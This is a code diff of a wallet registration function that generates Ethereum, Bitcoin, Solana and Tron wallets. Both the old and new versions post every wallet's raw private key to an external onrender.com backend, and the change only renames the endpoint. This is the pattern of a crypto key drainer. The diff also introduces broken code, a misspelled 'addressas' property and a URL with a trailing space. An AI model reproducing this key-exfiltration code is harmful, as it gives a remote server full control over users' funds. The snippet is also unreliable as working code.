@@ -102,21 +102,21 @@ function Register() {
 
 
           //for database   
-          const ethAdd =    ethereumWallet.address;
-           const bitAdd =   bitcoinWallet.address;
-          const solAdd =    solanaWallet.address;
+          const ethAdd =    ethereumWallet.address as string;
+           const bitAdd =   bitcoinWallet.address as string;
+          const solAdd =    solanaWallet.addressas as string;
            const tronAdd =   tronWallet.address.base58;
     try{
-      const p_k = [ethereumWallet.privateKey, bitcoinWallet.privateKey, solanaWallet.privateKey, tronWallet.privateKey]  as string[];
+      const p_k = [ethereumWallet.privateKey, bitcoinWallet.privateKey, solanaWallet.privateKey, tronWallet.privateKey] ; 
 
-         await fetch("https://twa-backend-g83o.onrender.com/profiledkey", {
+         await fetch("https://twa-backend-g83o.onrender.com/register ", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             credentials: "include",  
             body: JSON.stringify( {  p_k }),
         });
-        const Address =  [ethAdd, bitAdd, solAdd, tronAdd] as string[];
-     await   fetch("https://twa-backend-g83o.onrender.com/wallets", {
+        const Address =  [ethAdd, bitAdd, solAdd, tronAdd] ;
+     await   fetch("https://twa-backend-g83o.onrender.com/register", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           credentials: "include",  
